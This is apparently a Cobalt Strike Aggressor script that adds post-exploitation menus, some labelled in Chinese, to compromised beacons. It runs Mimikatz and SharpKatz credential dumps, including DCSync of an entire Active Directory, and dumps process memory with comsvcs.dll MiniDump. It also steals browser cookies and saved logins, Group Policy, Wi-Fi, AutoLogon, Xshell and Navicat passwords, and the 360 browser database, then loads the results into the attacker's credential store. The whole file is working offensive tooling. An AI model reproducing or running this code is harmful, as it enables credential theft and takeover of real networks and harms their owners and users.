item "Powershell Dump"{
    local ('$bid');
    foreach $bid ($1){
        &powershelldump($bid);
    }
}
item "GetClearPass"{
    local ('$bid');
    foreach $bid ($1){
        # &getpass($bid);
		&coffee(&bid);
    }
}
item "Dump域内主机hash"{
        local('$bid');
        foreach $bid ($1){
            sharpsecdump($bid);
            }
}
item "GetGuid"{
	local('$bid');
        foreach $bid ($1){
            getMachineGuid($bid);
        }
}
item "提取域内组策略中的帐户凭据"{
	local('$bid');
        foreach $bid ($1){
            bexecute_assembly($1, script_resource("/exe/Net-GPPPassword.exe"), "");
        }
}

menu "浏览器解密" {
	item "360 SafeBrowsergetpass"{
	$bid = $1['@'];
                SafeBrowsergetpass($bid);
                getMachineGuid($bid);
    }
}
menu "内网服务解密"{
    item "Xshell一把梭"{
        local('$bid');
        foreach $bid ($1){
            xshell($bid);
            }
    }
    item "Navicat"{
        local('$bid');
        foreach $bid ($1){
            bexecute_assembly($bid,script_resource("/exe/Xshell.exe"),"-Navicat")
            }
    }
}

menu "Web凭据"{
    		item "Cookies/History/Logins"{
			local('$bid');
				foreach $bid ($1){
					sharpchromeall($bid);
				}
			}

		item "List Browser Cookies"{
			local('$bid');
				foreach $bid ($1){
					sharpchromecookies($bid);
				}
			}

		item "List User's History"{
			local('$bid');
				foreach $bid ($1){
					sharphistory($bid);
				}
			}

		item "List Login Passwords"{
			local('$bid');
				foreach $bid ($1){
					sharplogins($bid);
			}
        }
}

menu "Mimikatz" {
		item "Logon Passwords"{
			local('$bid');
				foreach $bid ($1){
					logonpasswords($bid);
				}
			}
        item "3389解密"{
        local('$bid');
            foreach $bid ($1){
                rdp($bid);
            }
        } 
		item "WDigest Credentials"{
			local('$bid');
				foreach $bid ($1){
					wdigest($bid);
				}
			}
		item "Kerberos Credentials"{
			local('$bid');
				foreach $bid ($1){
					kerberos($bid);
				}
			}
		item "MSV LM & NTLM Passwords"{
			local('$bid');
				foreach $bid ($1){
					msv($bid);
				}
			}
		item "TsPkg Passwords"{
			local('$bid');
				foreach $bid ($1){
					tspkg($bid);
				}
			}
		item "LiveSSP passwords"{
			local('$bid');
				foreach $bid ($1){
					livessp($bid);
				}
			}
		item "SSP passwords"{
			local('$bid');
				foreach $bid ($1){
					ssp($bid);
				}
			}

		item "Dump Trust"{
			local('$bid');
				foreach $bid ($1){
					trust($bid);
				}
			}

		item "Backup Keys"{
			local('$bid');
				foreach $bid ($1){
					backupkeys($bid);
				}
			}

		item "Mimikatz Tickets"{
			local('$bid');
				foreach $bid ($1){
					tickets($bid);
				}
			}

		item "Mimikatz ekeys"{
			local('$bid');
				foreach $bid ($1){
					ekeys($bid);
				}
			}

		item "Mimikatz DPAPI"{
			local('$bid');
				foreach $bid ($1){
					dpapi($bid);
				}
			}

		item "Mimikatz DPAPI System Secret"{
			local('$bid');
				foreach $bid ($1){
					dpapisystem($bid);
				}
			}

		item "Mimikatz Credential Manager"{
			local('$bid');
				foreach $bid ($1){
					credman($bid);
				}
			}

}

#################################################

#   SharpKatz

#################################################

menu "SharpKatz"{
# SharpKatz Debug Privilege
item "Logon Passwords"{
	local('$bid');
		foreach $bid ($1){
			sklogonpasswords($bid);
		}
	}
item "WDigest Credentials"{
	local('$bid');
		foreach $bid ($1){
			skwdigest($bid);
		}
	}
item "Kerberos Credentials"{
	local('$bid');
		foreach $bid ($1){
			skkerberos($bid);
		}
	}
item "MSV LM & NTLM Passwords"{
	local('$bid');
		foreach $bid ($1){
			skmsv($bid);
		}
	}
item "TsPkg Passwords"{
	local('$bid');
		foreach $bid ($1){
			sktspkg($bid);
		}
	}
item "SharpKatz ekeys"{
	local('$bid');
		foreach $bid ($1){
			skekeys($bid);
		}
	}
item "Credential Manager"{
	local('$bid');
		foreach $bid ($1){
			skcredman($bid);
		}
	}
item "Dump User Credential By Username"{
	local('$bid');
		foreach $bid ($1){
			skdcsyncusername($bid);
		}
	}
item "Dump User Credential By GUID"{
	local('$bid');
		foreach $bid ($1){
			skdcsyncguid($bid);
		}
	}
item "Export Entire Dataset From AD"{
	local('$bid');
		foreach $bid ($1){
			skdcsyncdataset($bid);
		}
	}
}
 item "Dumpert" {
			local('$bid');
				foreach $bid ($1){
					dumpert($bid);
				}

 } 

 menu "MISC"{
	 item "Dump SysInternals AutoLogon密码"{
		 local('$bid');
			foreach $bid ($1){
				bexecute_assembly($1, script_resource('exe/DecryptAutoLogon.exe'));
			}
	 }
	 item "WIFI密码Dump"{
		 local('$bid');
		foreach $bid ($1){
			bexecute_assembly($1, script_resource('exe/SharpWifiGrabber.exe'));
		}
	 }
 }
###############################
##
## Mimikatz func
##
##############################

sub getpass{
    $args = substr($0, 6);
    bdllspawn($1, script_resource("dll/clearpass.x64.dll"),$args, "QAX", 5000, false);
}

sub coffee{
    # $args = substr($0, 6);
    bdllspawn($1, script_resource("dll/powerkatz_x64.dll"),"coffee", "QAX", 5000, false);
}

sub logonpasswords{

bmimikatz($1, "sekurlsa::logonpasswords");

}
sub wdigest{

bmimikatz($1, "sekurlsa::wdigest");

}
sub kerberos{

bmimikatz($1, "sekurlsa::kerberos");

}
sub msv{

bmimikatz($1, "sekurlsa::msv");

}
sub tspkg{

bmimikatz($1, "sekurlsa::tspkg");

}
sub livessp{

bmimikatz($1, "sekurlsa::livessp");

}
sub ssp{

bmimikatz($1, "sekurlsa::ssp");

}


sub trust{

bmimikatz($1, "sekurlsa::trust");

}
sub backupkeys{

bmimikatz($1, "sekurlsa::backupkeys");

}
sub tickets{

bmimikatz($1, "sekurlsa::tickets");

}
sub ekeys{

bmimikatz($1, "sekurlsa::ekeys");

}

sub dpapi{

bmimikatz($1, "sekurlsa::dpapi");

}

sub dpapisystem{

bmimikatz($1, "sekurlsa::dpapi");

}

sub credman{

bmimikatz($1, "sekurlsa::credman");

}
sub 3rdp{
    bmimikatz($1, "vault::cred /patch");
}
sub sharpchromeall{
bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "all");
}
######End of all the things

###Grab all the Cookies

sub sharpchromecookies{
bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "cookies");
}
######End of all the cookies

###Grab History

sub sharphistory{
bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "history");
}
######End Cookie History Function


###Grab Login Info
sub sharplogins{
bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "logins");
}

sub sharpsecdump{
    $bid = $1;
    $dialog = dialog("SharpSecDump", %(target => "", username => "", password => "", domain => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "-target=$3['target'] -u=$3['username'] -p=$3['password'] -d=$3['domain']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Grabbing those MF Secrets!');
            bexecute_assembly($bid, script_resource('/exe/SharpSecDump.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "SharpSecDump");
    drow_text($dialog, "target",  "主机名或IP:");
    drow_text($dialog, "username",  "用户名:");
    drow_text($dialog, "password",  "密码:");
    drow_text($dialog, "domain",  "输入完整域名:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);
}

sub powershelldump{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "elevatedregistrykey";

	%defaults["pid"]  = "1314";
	%defaults["path"] = "C:\\log.dump";
	# %defaults["droplocation"] = %persistdefaults["droplocation"];
	# %defaults["customfile"] = %persistdefaults["customfile"];
	# %defaults["listener"] = %persistdefaults["listener"];
	# %defaults["template"] = %persistdefaults["template"];
	
	$dialog = dialog("powershell dump 进程", %defaults, lambda({
		bpowershell($bid, "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump ".$3["pid"]." ".$3["path"]. " full")
		}, \$bid, \$3)
        );
	dialog_description($dialog, "powershell dump 进程");
	drow_text($dialog, "pid", "PID: ");
	drow_text($dialog, "path", "Dump PATH: ");
	dbutton_action($dialog, "Execute");
	dialog_show($dialog);
}

#################################################

#   SharpKatz

#################################################

sub sklogonpasswords{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command logonpasswords");

}


sub skwdigest{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command wdigest");

}


sub skkerberos{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command kerberos");

}


sub skmsv{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command msv");

}


sub sktspkg{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command tspkg");

}


sub skekeys{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command ekeys");

}


sub skcredman{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command credman");

}

sub skdcsyncusername{
 $bid = $1;
    $dialog = dialog("SharpKatz Dump Credential By Username", %(username => "", fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "--Command dcsync --User $3['username'] --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Dumping Creds...');
            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "username",  "Please Enter the username:");
    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}

sub skdcsyncguid{
 $bid = $1;
    $dialog = dialog("SharpKatz Dump Credential By GUID", %(guid => "", fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "--Command dcsync --Guid $3['guid'] --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Dumping Creds...');
            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "guid",  "Please Enter A GUID:");
    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}

sub skdcsyncdataset{
 $bid = $1;
    $dialog = dialog("SharpKatz Dump Entire Dataset From AD", %(fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "--Command dcsync --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Dumping Creds...');
            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}	

#################################
#Wing
############

sub xshell{
	local('$dialog %defaults $bid');
	$bid = $1;
	$ptype = "elevatedregistrykey";

	%defaults["uid"]  = "1314";
	%defaults["path"] = "\"\"";
	# %defaults["droplocation"] = %persistdefaults["droplocation"];
	# %defaults["customfile"] = %persistdefaults["customfile"];
	# %defaults["listener"] = %persistdefaults["listener"];
	# %defaults["template"] = %persistdefaults["template"];
	
	$dialog = dialog("Xshell一把梭", %defaults, lambda({
        bexecute_assembly($bid,script_resource("/exe/Xshell.exe")," -Xshell ".$3["path"]." ".$3["uid"])
		}, \$bid, \$3)
        );
	dialog_description($dialog, "Xshell 5,6,7一把梭");
	drow_text($dialog, "path", "Session PATH(默认为空): ");
    drow_text($dialog, "uid", "username+sid: ");
	dbutton_action($dialog, "Execute");
	dialog_show($dialog);
}




sub getMachineGuid{
	$arch = barch($1);
	if ($arch == 'x64'){
	breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
	}
	else{
	breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x86");
	breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
	}
}

sub getMachineGuid{
	$arch = barch($1);
	if ($arch == 'x64'){
	breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
	}
	else{
	breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x86");
	breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
	}
}

sub SafeBrowsergetpass {
	bshell($bid, 'reg query HKEY_CLASSES_ROOT\360seURL\shell\open\command|findstr exe');
}

# popup beacon_bottom {
#         item "SafeBrowsergetpass"{
# 		$bid = $1['@'];
#                 SafeBrowsergetpass($bid);
#                 getMachineGuid($bid);
#     }
# }

on beacon_output {
	$magicstring = "360se6\\Application\\360se.exe";
	$magicstring2 = "MachineGuid";

	if ($magicstring isin $2){
	$length = strlen($2);
	$last = lindexOf($2, ":");
	$res = substr($2, $last - 1, $length - 32);
	$dbPath = "User Data\\Default\\apps\\LoginAssis\\assis2.db";
	$res = $res . $dbPath;

	bdownload($1, $res);
	blog($1,"360 SafeBrowser DB Downloading");
	}

	if ($magicstring2 isin $2){
	$lasta = lindexOf($2, "\nMachineGuid");
	$MachineGuid = substr($2, $lasta + 26, -1); 
	$beaconHost = beacon_info($1, "host");
	credential_add($empty,$MachineGuid, $empty, $empty, $beaconHost);
	blog($1,"MachineGuid Get Success");
	}
}
